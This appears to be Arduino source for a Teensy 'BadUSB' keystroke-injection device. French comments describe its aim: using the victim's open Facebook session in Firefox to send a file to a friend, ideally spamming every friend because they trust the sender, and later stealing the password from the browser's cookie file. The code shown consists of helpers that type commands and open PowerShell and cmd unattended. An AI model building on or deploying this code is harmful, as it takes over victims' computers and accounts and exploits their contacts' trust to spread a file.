void setup() {
  // put your setup code here, to run once:
  
  /*
   * Cette partie permet d'envoyer un message à une personne aleatoire faisant partie de la liste des amis sur le compte facebook de l'utilisateur en cours.
   * Une meilleure implementation serait d'essayer de spammer la liste des amis vu que la personne qui va leur envoyer le fichier est une personne de confiance
   * Par manque de temps je n'ai pas implementer la partie ou teensy cherche le mot de passe dans le fichier cookies c'est pour cela que j'ai suppposé que
   * la session est déjà ouverte (c'est le cas pour une bonne partie des gens) 
   * 
   */


   sendMsgFBFirefox();
}

void loop() {
  // put your main code here, to run repeatedly:

}

void initialise(){
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
}

void writeCMD(String cmd){
    delay(100);
    Keyboard.print(cmd);  
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(KEY_ENTER);  
    Keyboard.send_now();
    delay(100);

    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
}

void openPowerShell(){
   delay(1000);
    
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

  
    Keyboard.println("PowerShell");  
    Keyboard.send_now();
    delay(100);


     Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
}

void opencmd(){

    delay(1000);
    
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

  
    Keyboard.print("cmd");  
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(KEY_ENTER);  
    Keyboard.send_now();
    delay(100);

     Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
  
}

